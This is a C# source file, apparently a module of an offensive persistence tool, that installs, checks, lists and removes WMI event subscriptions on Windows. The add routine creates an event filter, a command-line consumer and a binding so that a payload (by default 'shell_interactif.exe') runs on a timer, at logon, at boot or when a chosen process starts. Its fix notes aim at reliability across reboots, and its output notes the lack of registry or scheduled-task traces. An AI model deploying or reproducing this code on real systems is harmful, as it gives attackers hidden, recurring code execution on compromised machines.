using System;
using System.Diagnostics;
using System.Management;
using System.Collections.Generic;
using System.IO;

namespace Persist
{
    /// <summary>
    /// WMI Event Subscription persistence.
    ///
    /// Creates three WMI objects in ROOT\subscription:
    ///   1. __EventFilter       — defines WHEN to fire (e.g. every 60 s, at logon, on process start)
    ///   2. CommandLineEventConsumer — defines WHAT to run (the payload)
    ///   3. __FilterToConsumerBinding — links filter → consumer
    ///
    /// Trigger options (-o):
    ///   interval   — fires every 60 seconds (TimerInstruction, default)
    ///   logon      — fires on any interactive logon (Win32_LogonSession creation)
    ///   startup    — fires when userinit.exe is created (boot/logon detection)
    ///   process    — fires when a new process is created (Win32_Process creation)
    ///
    /// Additional args (-a):
    ///   interval=XX   — custom interval in seconds
    ///   process=NAME  — specific process name to monitor
    ///
    /// Requires admin rights (writes to ROOT\subscription).
    ///
    /// FIX HISTORY:
    ///   [FIX-1] EnsureTimerInstruction: __IntervalTimerInstruction must be created in
    ///           ROOT\subscription (not ROOT\cimv2). The __TimerEvent is dispatched
    ///           within the subscription namespace — placing the instruction in cimv2
    ///           means the EventFilter in ROOT\subscription never receives it.
    ///
    ///   [FIX-2] CommandLineEventConsumer.RunInteractively must be false for
    ///           better reboot reliability in shell-only mode (service context).
    ///
    ///   [FIX-3] startup trigger moved to SystemUpTime-based query (instead of
    ///           userinit.exe creation) to avoid missing early-boot/logon races.
    ///
    ///   [FIX-4] CommandLineEventConsumer.ExecutablePath is now populated when
    ///           possible, improving payload launch reliability after reboot.
    /// </summary>
    public class WmiSubscription : Persistence
    {
        private const string DefaultPayload = "shell_interactif.exe";

        // WMI namespace where permanent subscriptions live
        private const string WmiNamespace = @"\\.\ROOT\subscription";

        // Valid trigger options
        private static readonly string[] ValidOptions = { "interval", "logon", "startup", "process" };

        // 🔥 Stockage des valeurs personnalisées
        private int _customIntervalSeconds = 60;
        private string _customProcessName = null;

        public WmiSubscription(
            string persistMethod, string command, string commandArg,
            string theKey, string theVal, string theName,
            string filePath, string status, string option)
            : base(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option)
        {
            // 🔥 Parser commandArg avant initialisation
            ParseCommandArg(commandArg);
            
            initialize(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option);
        }

        // ------------------------------------------------------------------ //
        //  Parser pour commandArg                                             //
        // ------------------------------------------------------------------ //

        private void ParseCommandArg(string commandArg)
        {
            if (string.IsNullOrWhiteSpace(commandArg))
                return;

            Console.WriteLine($"[*] Parsing commandArg: {commandArg}");

            if (commandArg.StartsWith("interval=", StringComparison.OrdinalIgnoreCase))
            {
                string value = commandArg.Substring(9);
                if (int.TryParse(value, out int seconds) && seconds > 0)
                {
                    _customIntervalSeconds = seconds;
                    Console.WriteLine($"[+] Custom interval set to {_customIntervalSeconds} seconds");
                }
                else
                {
                    Console.WriteLine($"[-] Invalid interval value: {value}, using default 60");
                }
            }
            else if (commandArg.StartsWith("process=", StringComparison.OrdinalIgnoreCase))
            {
                _customProcessName = commandArg.Substring(8);
                Console.WriteLine($"[+] Custom process name set to '{_customProcessName}'");
            }
            else
            {
                Console.WriteLine($"[!] Unknown commandArg format: {commandArg}");
            }
        }

        /// <summary>
/// Vérifie si un processus existe sur le système (dans tous les emplacements standards)
/// </summary>
private bool CheckIfProcessExists(string processName)
{
    try
    {
        // Enlever l'extension .exe pour la recherche
        string processNameWithoutExt = processName;
        if (processNameWithoutExt.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
        {
            processNameWithoutExt = processNameWithoutExt.Substring(0, processNameWithoutExt.Length - 4);
        }
        
        // 1. Vérifier si le processus tourne actuellement
        Process[] runningProcesses = Process.GetProcessesByName(processNameWithoutExt);
        if (runningProcesses.Length > 0)
        {
            Console.WriteLine($"[*] Process '{processName}' is currently running");
            return true;
        }
        
        // 2. Rechercher dans tous les emplacements possibles
        List<string> searchPaths = new List<string>();
        
        // Dossiers système Windows
        searchPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));      // C:\Windows\System32
        searchPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Windows));      // C:\Windows
        
        // Dossier SysWOW64 (s'il existe)
        string sysWOW64 = Environment.GetFolderPath(Environment.SpecialFolder.System)?.Replace("System32", "SysWOW64");
        if (!string.IsNullOrEmpty(sysWOW64) && Directory.Exists(sysWOW64))
        {
            searchPaths.Add(sysWOW64);
        }
        
        // Program Files
        searchPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));     // C:\Program Files
        searchPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));  // C:\Program Files (x86)
        
        // Common Program Files
        searchPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles));
        searchPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFilesX86));
        
        // Dossier utilisateur AppData
        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        if (!string.IsNullOrEmpty(localAppData))
        {
            searchPaths.Add(localAppData);  // C:\Users\<user>\AppData\Local
        }
        
        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        if (!string.IsNullOrEmpty(appData))
        {
            searchPaths.Add(appData);  // C:\Users\<user>\AppData\Roaming
        }
        
        // Dossier ProgramData
        string programData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
        if (!string.IsNullOrEmpty(programData))
        {
            searchPaths.Add(programData);  // C:\ProgramData
        }
        
        // Recherche récursive dans les dossiers (limité pour ne pas être trop lent)
        foreach (string basePath in searchPaths)
        {
            if (string.IsNullOrEmpty(basePath) || !Directory.Exists(basePath))
                continue;
            
            // Chercher le fichier directement dans le dossier
            string fullPath = Path.Combine(basePath, processName);
            if (File.Exists(fullPath))
            {
                Console.WriteLine($"[*] Process found at: {fullPath}");
                return true;
            }
            
            // Chercher dans les sous-dossiers (limité à 2 niveaux pour la performance)
            try
            {
                foreach (string subDir in Directory.GetDirectories(basePath))
                {
                    fullPath = Path.Combine(subDir, processName);
                    if (File.Exists(fullPath))
                    {
                        Console.WriteLine($"[*] Process found at: {fullPath}");
                        return true;
                    }
                    
                    // Deuxième niveau (pour les apps comme Chrome/Program Files/Google/Chrome)
                    try
                    {
                        foreach (string subSubDir in Directory.GetDirectories(subDir))
                        {
                            fullPath = Path.Combine(subSubDir, processName);
                            if (File.Exists(fullPath))
                            {
                                Console.WriteLine($"[*] Process found at: {fullPath}");
                                return true;
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
        
        // 3. Chercher dans le PATH système
        string pathEnv = Environment.GetEnvironmentVariable("PATH") ?? "";
        foreach (string pathDir in pathEnv.Split(Path.PathSeparator))
        {
            try
            {
                if (string.IsNullOrEmpty(pathDir) || !Directory.Exists(pathDir))
                    continue;
                    
                string fullPath = Path.Combine(pathDir, processName);
                if (File.Exists(fullPath))
                {
                    Console.WriteLine($"[*] Process found in PATH: {fullPath}");
                    return true;
                }
            }
            catch { }
        }
        
        Console.WriteLine($"[!] Process '{processName}' not found on this system");
        return false;
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[!] WARNING: Could not verify process existence: {ex.Message}");
        return true; // En cas d'erreur, on laisse passer
    }
}

        // ------------------------------------------------------------------ //
        //  Router                                                              //
        // ------------------------------------------------------------------ //

        public void initialize(
            string persistMethod, string command, string commandArg,
            string theKey, string theVal, string theName,
            string filePath, string status, string option)
        {
            if (status.ToLower().Equals("add"))
            {
                if (theName.Equals(""))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must give a subscription name (-n). See help (-h).");
                    return;
                }
                addPersistence(command, commandArg, theName, option);
            }

            else if (status.ToLower().Equals("remove"))
            {
                if (theName.Equals(""))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must give a subscription name (-n). See help (-h).");
                    return;
                }
                removePersistence(theName);
            }

            else if (status.ToLower().Equals("check"))
            {
                checkPersistence(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option);
            }

            else if (status.ToLower().Equals("list"))
            {
                listPersistence(theName);
            }

            else
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: Invalid method given. Must give add, remove, check or list. See help (-h).");
            }
        }

        // ------------------------------------------------------------------ //
        //  ADD                                                                 //
        // ------------------------------------------------------------------ //

        public void addPersistence(string command, string commandArg, string theName, string option)
{
    string payload = BuildPayload(command, commandArg);
    string trigger = NormalizeOption(option);

    Console.WriteLine("");
    Console.WriteLine("[*] INFO: Adding WMI subscription persistence");
    Console.WriteLine("[*] INFO: Subscription Name : " + theName);
    Console.WriteLine("[*] INFO: Payload           : " + payload);
    Console.WriteLine("[*] INFO: Trigger           : " + trigger);
    
    // 🔥 Afficher les valeurs personnalisées
    if (trigger.Equals("interval") && _customIntervalSeconds != 60)
    {
        Console.WriteLine($"[*] INFO: Custom interval    : {_customIntervalSeconds} seconds");
    }
    else if (trigger.Equals("process") && !string.IsNullOrEmpty(_customProcessName))
    {
        Console.WriteLine($"[*] INFO: Custom process     : {_customProcessName}");
    }
    Console.WriteLine("");

    // 🔥 VALIDATION POUR PROCESS - Vérifier si le processus existe sur la cible
    if (trigger.Equals("process") && !string.IsNullOrEmpty(_customProcessName))
    {
        bool processExists = CheckIfProcessExists(_customProcessName);
        
        if (!processExists)
        {
            Console.WriteLine("");
            Console.WriteLine("[-] ERROR: Process '" + _customProcessName + "' does NOT exist on this system!");
            Console.WriteLine("[*] INFO: WMI subscription will NOT be created.");
            Console.WriteLine("[*] INFO: Please check the process name and try again.");
            return;
        }
        
        Console.WriteLine("[+] SUCCESS: Process '" + _customProcessName + "' found on this system");
        Console.WriteLine("");
    }

    // Validate trigger option
    if (!IsValidOption(trigger))
    {
        Console.WriteLine("[-] ERROR: Invalid trigger option. Use: interval, logon, startup, process. See help (-h).");
        return;
    }

    // Check admin rights — ROOT\subscription requires elevation
    if (!lib.Utils.IsUserAnAdmin())
    {
        Console.WriteLine("[-] ERROR: WMI subscription persistence requires administrator privileges.");
        return;
    }

    // Check if subscription already exists
    if (WmiObjectExists("__EventFilter", theName))
    {
        Console.WriteLine("[-] ERROR: WMI subscription with that name already exists. Remove it first.");
        return;
    }

    try
    {
        ManagementScope scope = new ManagementScope(WmiNamespace);
        scope.Connect();

        // ---- 0. For interval trigger: ensure timer instruction exists ----
        if (trigger.Equals("interval"))
        {
            // 🔥 Utiliser l'intervalle personnalisé
            EnsureTimerInstruction(scope, _customIntervalSeconds);
            Console.WriteLine($"[+] SUCCESS: __IntervalTimerInstruction ({_customIntervalSeconds}s) ensured in ROOT\\subscription.");
        }

        // ---- 1. Create __EventFilter ----
        ManagementClass filterClass = new ManagementClass(scope,
            new ManagementPath("__EventFilter"), null);

        ManagementObject filter = filterClass.CreateInstance();
        filter["Name"]          = theName;
        filter["QueryLanguage"] = "WQL";
        
        // 🔥 Utiliser BuildWqlQuery avec process name personnalisé
        string wqlQuery;
        if (trigger.Equals("process") && !string.IsNullOrEmpty(_customProcessName))
        {
            wqlQuery = BuildWqlQuery(trigger, _customProcessName);
        }
        else
        {
            wqlQuery = BuildWqlQuery(trigger);
        }
        filter["Query"] = wqlQuery;
        filter["EventNameSpace"]= BuildEventNamespace(trigger);
        filter.Put();

        Console.WriteLine("[+] SUCCESS: __EventFilter created.");

        // ---- 2. Create CommandLineEventConsumer ----
        ManagementClass consumerClass = new ManagementClass(scope,
            new ManagementPath("CommandLineEventConsumer"), null);

        ManagementObject consumer = consumerClass.CreateInstance();
        consumer["Name"]                = theName;
        consumer["CommandLineTemplate"] = payload;
        string executablePath = ExtractExecutablePath(payload);
        if (!string.IsNullOrWhiteSpace(executablePath))
        {
            consumer["ExecutablePath"] = executablePath;
        }
        consumer["RunInteractively"]    = false;
        consumer.Put();

        Console.WriteLine("[+] SUCCESS: CommandLineEventConsumer created.");

        // ---- 3. Create __FilterToConsumerBinding ----
        ManagementClass bindingClass = new ManagementClass(scope,
            new ManagementPath("__FilterToConsumerBinding"), null);

        ManagementObject binding = bindingClass.CreateInstance();
        binding["Filter"]   = filter.Path.RelativePath;
        binding["Consumer"] = consumer.Path.RelativePath;
        binding.Put();

        Console.WriteLine("[+] SUCCESS: __FilterToConsumerBinding created.");
        Console.WriteLine("");
        Console.WriteLine("[+] SUCCESS: WMI subscription persistence added.");
        Console.WriteLine("[*] INFO: Subscription will trigger on: " + trigger);
        Console.WriteLine("[*] INFO: No registry key or scheduled task created.");
    }
    catch (UnauthorizedAccessException)
    {
        Console.WriteLine("[-] ERROR: Access denied. Run as administrator to create WMI subscriptions.");
        return;
    }
    catch (ManagementException mex)
    {
        Console.WriteLine("[-] ERROR: WMI error: " + mex.Message);
        return;
    }
    catch (Exception ex)
    {
        Console.WriteLine("[-] ERROR: Unexpected error: " + ex.Message);
        return;
    }

} // end addPersistence
        // ------------------------------------------------------------------ //
        //  REMOVE                                                              //
        // ------------------------------------------------------------------ //

        public void removePersistence(string theName)
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Removing WMI subscription persistence");
            Console.WriteLine("[*] INFO: Subscription Name: " + theName);
            Console.WriteLine("");

            if (!lib.Utils.IsUserAnAdmin())
            {
                Console.WriteLine("[-] ERROR: WMI subscription removal requires administrator privileges.");
                return;
            }

            if (!WmiObjectExists("__EventFilter", theName))
            {
                Console.WriteLine("[-] ERROR: WMI subscription with that name does not exist.");
                return;
            }

            bool allRemoved = true;

            // Remove in reverse order: binding → consumer → filter
            allRemoved &= DeleteWmiObject("__FilterToConsumerBinding", theName);
            allRemoved &= DeleteWmiObject("CommandLineEventConsumer",  theName);
            allRemoved &= DeleteWmiObject("__EventFilter",             theName);

            // Also clean up the timer instruction if no other interval subscriptions remain
            TryRemoveOrphanedTimerInstruction();

            if (allRemoved)
            {
                Console.WriteLine("[+] SUCCESS: WMI subscription removed successfully.");
                Console.WriteLine("[*] INFO: Subscription Name: " + theName);
            }
            else
            {
                Console.WriteLine("[!] WARN: Some WMI objects could not be removed. Check manually in ROOT\\subscription.");
            }

        } // end removePersistence

        // ------------------------------------------------------------------ //
        //  CHECK                                                               //
        // ------------------------------------------------------------------ //

        public void checkPersistence(
            string persistMethod, string command, string commandArg,
            string theKey, string theVal, string theName,
            string filePath, string status, string option)
        {
            string trigger = NormalizeOption(option);

            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking WMI subscription arguments.");
            Console.WriteLine("");

            // Validate name
            if (string.IsNullOrWhiteSpace(theName))
            {
                Console.WriteLine("[-] ERROR: Subscription name is required (-n). See help (-h).");
                return;
            }
            Console.WriteLine("[+] SUCCESS: Subscription name provided: " + theName);

            // Validate trigger option
            if (!IsValidOption(trigger))
            {
                Console.WriteLine("[-] ERROR: Invalid trigger option (-o). Must be: interval, logon, startup, process.");
                return;
            }
            Console.WriteLine("[+] SUCCESS: Trigger option is valid: " + trigger);

            // Check admin rights
            if (!lib.Utils.IsUserAnAdmin())
            {
                Console.WriteLine("[-] ERROR: You do NOT have administrator privileges. WMI subscriptions require elevation.");
            }
            else
            {
                Console.WriteLine("[+] SUCCESS: You have administrator privileges.");
            }

            // Check if subscription already exists
            bool exists = WmiObjectExists("__EventFilter", theName);
            if (exists)
            {
                Console.WriteLine("[-] ERROR: WMI subscription '" + theName + "' already exists — add would be blocked.");
            }
            else
            {
                Console.WriteLine("[+] SUCCESS: Subscription name '" + theName + "' is available.");
            }

            // Show what WQL query would be created
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: WQL query that would be used:");
            if (trigger.Equals("process") && !string.IsNullOrEmpty(_customProcessName))
            {
                Console.WriteLine(BuildWqlQuery(trigger, _customProcessName));
            }
            else
            {
                Console.WriteLine(BuildWqlQuery(trigger));
            }
            Console.WriteLine("[*] INFO: Payload that would be executed:");
            Console.WriteLine(BuildPayload(command, commandArg));

        } // end checkPersistence

        // ------------------------------------------------------------------ //
        //  LIST                                                                //
        // ------------------------------------------------------------------ //

        public void listPersistence(string theName)
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Listing WMI subscription persistence entries.");
            Console.WriteLine("");

            if (!lib.Utils.IsUserAnAdmin())
            {
                Console.WriteLine("[-] ERROR: Listing WMI subscriptions requires administrator privileges.");
                return;
            }

            try
            {
                ManagementScope scope = new ManagementScope(WmiNamespace);
                scope.Connect();

                // If a specific name is given, list only that subscription
                string filterClause = string.IsNullOrWhiteSpace(theName)
                    ? ""
                    : $" WHERE Name = '{EscapeWql(theName)}'";

                ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    scope,
                    new ObjectQuery($"SELECT * FROM __EventFilter{filterClause}"));

                ManagementObjectCollection filters = searcher.Get();

                if (filters.Count == 0)
                {
                    Console.WriteLine("[*] INFO: No WMI subscription persistence entries found.");
                    return;
                }

                foreach (ManagementObject filter in filters)
                {
                    string name  = filter["Name"]?.ToString()  ?? "(unknown)";
                    string query = filter["Query"]?.ToString() ?? "(none)";

                    Console.WriteLine("[*] INFO: SUBSCRIPTION NAME:");
                    Console.WriteLine(name);
                    Console.WriteLine("");

                    Console.WriteLine("[*] INFO: EVENT FILTER (WQL):");
                    Console.WriteLine(query);
                    Console.WriteLine("");

                    // Fetch the matching consumer
                    ManagementObjectSearcher cs = new ManagementObjectSearcher(
                        scope,
                        new ObjectQuery($"SELECT * FROM CommandLineEventConsumer WHERE Name = '{EscapeWql(name)}'"));

                    foreach (ManagementObject consumer in cs.Get())
                    {
                        Console.WriteLine("[*] INFO: CONSUMER COMMAND LINE:");
                        Console.WriteLine(consumer["CommandLineTemplate"]?.ToString() ?? "(none)");
                        Console.WriteLine("[*] INFO: RUN INTERACTIVELY:");
                        Console.WriteLine(consumer["RunInteractively"]?.ToString() ?? "(unknown)");
                        Console.WriteLine("");
                    }

                    // Binding status
                    ManagementObjectSearcher bs = new ManagementObjectSearcher(
                        scope,
                        new ObjectQuery($"SELECT * FROM __FilterToConsumerBinding WHERE Filter = \"__EventFilter.Name='{EscapeWql(name)}'\""));

                    int bindingCount = 0;
                    foreach (ManagementObject _ in bs.Get()) bindingCount++;

                    Console.WriteLine("[*] INFO: BINDING STATUS:");
                    Console.WriteLine(bindingCount > 0
                        ? "Active (" + bindingCount + " binding(s))"
                        : "WARNING: No binding found — subscription is inactive.");
                    Console.WriteLine("");
                    Console.WriteLine("");
                    Console.WriteLine("");
                }
            }
            catch (ManagementException mex)
            {
                Console.WriteLine("[-] ERROR: WMI error while listing: " + mex.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] ERROR: Unexpected error: " + ex.Message);
            }

        } // end listPersistence

        // ------------------------------------------------------------------ //
        //  WMI helpers                                                         //
        // ------------------------------------------------------------------ //

        private static bool WmiObjectExists(string wmiClass, string name)
        {
            try
            {
                ManagementScope scope = new ManagementScope(WmiNamespace);
                scope.Connect();

                ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    scope,
                    new ObjectQuery($"SELECT * FROM {wmiClass} WHERE Name = '{EscapeWql(name)}'"));

                return searcher.Get().Count > 0;
            }
            catch
            {
                return false;
            }
        }

        private static bool DeleteWmiObject(string wmiClass, string name)
        {
            try
            {
                ManagementScope scope = new ManagementScope(WmiNamespace);
                scope.Connect();

                string query = wmiClass.Equals("__FilterToConsumerBinding")
                    ? $"SELECT * FROM __FilterToConsumerBinding WHERE Filter = \"__EventFilter.Name='{EscapeWql(name)}'\""
                    : $"SELECT * FROM {wmiClass} WHERE Name = '{EscapeWql(name)}'";

                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, new ObjectQuery(query));
                ManagementObjectCollection results = searcher.Get();

                if (results.Count == 0)
                {
                    Console.WriteLine("[!] WARN: " + wmiClass + " '" + name + "' not found — may already be removed.");
                    return true;
                }

                foreach (ManagementObject obj in results)
                {
                    obj.Delete();
                    Console.WriteLine("[+] SUCCESS: " + wmiClass + " '" + name + "' removed.");
                }

                return true;
            }
            catch (ManagementException mex)
            {
                Console.WriteLine("[-] ERROR: Failed to remove " + wmiClass + ": " + mex.Message);
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] ERROR: Unexpected error removing " + wmiClass + ": " + ex.Message);
                return false;
            }
        }

        private static void TryRemoveOrphanedTimerInstruction()
        {
            try
            {
                ManagementScope subScope = new ManagementScope(WmiNamespace);
                subScope.Connect();

                ManagementObjectSearcher check = new ManagementObjectSearcher(
                    subScope,
                    new ObjectQuery("SELECT * FROM __EventFilter WHERE Query LIKE '%PersistTimer%'"));

                if (check.Get().Count > 0)
                    return;

                ManagementObjectSearcher timerSearch = new ManagementObjectSearcher(
                    subScope,
                    new ObjectQuery("SELECT * FROM __IntervalTimerInstruction WHERE TimerID = 'PersistTimer'"));

                foreach (ManagementObject timer in timerSearch.Get())
                {
                    timer.Delete();
                    Console.WriteLine("[+] SUCCESS: Orphaned __IntervalTimerInstruction 'PersistTimer' removed.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] WARN: Could not clean up timer instruction: " + ex.Message);
            }
        }

        // ------------------------------------------------------------------ //
        //  WQL query builder                                                  //
        // ------------------------------------------------------------------ //

        private static string BuildWqlQuery(string trigger, string customProcessName = null)
        {
            switch (trigger)
            {
                case "interval":
                    return "SELECT * FROM __TimerEvent WHERE TimerID = 'PersistTimer'";

                case "logon":
                    return "SELECT * FROM __InstanceCreationEvent WITHIN 15 " +
                           "WHERE TargetInstance ISA 'Win32_LogonSession' " +
                           "AND TargetInstance.LogonType = 2";

                case "startup":
                    return "SELECT * FROM __InstanceModificationEvent WITHIN 10 " +
                           "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' " +
                           "AND TargetInstance.SystemUpTime >= 60 " +
                           "AND TargetInstance.SystemUpTime < 900";

                case "process":
                    string query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 " +
                                   "WHERE TargetInstance ISA 'Win32_Process'";
                    if (!string.IsNullOrEmpty(customProcessName))
                    {
                        query += $" AND TargetInstance.Name = '{customProcessName}'";
                    }
                    return query;

                default:
                    return "SELECT * FROM __TimerEvent WHERE TimerID = 'PersistTimer'";
            }
        }

        private static string BuildEventNamespace(string trigger)
        {
            if (trigger.Equals("interval"))
                return @"root\subscription";
            return @"root\cimv2";
        }

        // 🔥 VERSION MODIFIÉE AVEC PARAMÈTRE INTERVAL
        private static void EnsureTimerInstruction(ManagementScope subscriptionScope, int intervalSeconds)
        {
            const string timerId = "PersistTimer";
            uint intervalMs = (uint)intervalSeconds * 1000;

            ManagementObjectSearcher check = new ManagementObjectSearcher(
                subscriptionScope,
                new ObjectQuery($"SELECT * FROM __IntervalTimerInstruction WHERE TimerID = '{timerId}'"));

            if (check.Get().Count > 0)
            {
                foreach (ManagementObject timer in check.Get())
                {
                    timer["IntervalBetweenEvents"] = intervalMs;
                    timer.Put();
                    Console.WriteLine($"[+] SUCCESS: Timer interval updated to {intervalSeconds} seconds");
                }
                return;
            }

            ManagementClass timerClass = new ManagementClass(
                subscriptionScope,
                new ManagementPath("__IntervalTimerInstruction"), null);

            ManagementObject newTimer = timerClass.CreateInstance();
            newTimer["TimerID"] = timerId;
            newTimer["IntervalBetweenEvents"] = intervalMs;
            newTimer.Put();
        }

        // ------------------------------------------------------------------ //
        //  Helpers                                                             //
        // ------------------------------------------------------------------ //

        private static string BuildPayload(string command, string commandArg)
{
    // commandArg est déjà inclus dans command via le flag -a
    // Ne pas le concaténer à nouveau
    return string.IsNullOrWhiteSpace(command) ? DefaultPayload : command;
}

        private static string NormalizeOption(string option)
        {
            string o = (option ?? "").Trim().ToLower();
            return string.IsNullOrWhiteSpace(o) ? "interval" : o;
        }

        private static bool IsValidOption(string option)
        {
            foreach (string v in ValidOptions)
                if (v.Equals(option)) return true;
            return false;
        }

        private static string ExtractExecutablePath(string payload)
        {
            string value = (payload ?? string.Empty).Trim();
            if (string.IsNullOrWhiteSpace(value))
                return string.Empty;

            if (value.StartsWith("\"", StringComparison.Ordinal))
            {
                int closingQuote = value.IndexOf('"', 1);
                if (closingQuote > 1)
                    return value.Substring(1, closingQuote - 1);
            }

            int firstSpace = value.IndexOf(' ');
            if (firstSpace > 0)
                return value.Substring(0, firstSpace);

            return value;
        }

        private static string EscapeWql(string value)
        {
            return (value ?? "").Replace("'", "\\'");
        }

    } // end class

} // end namespace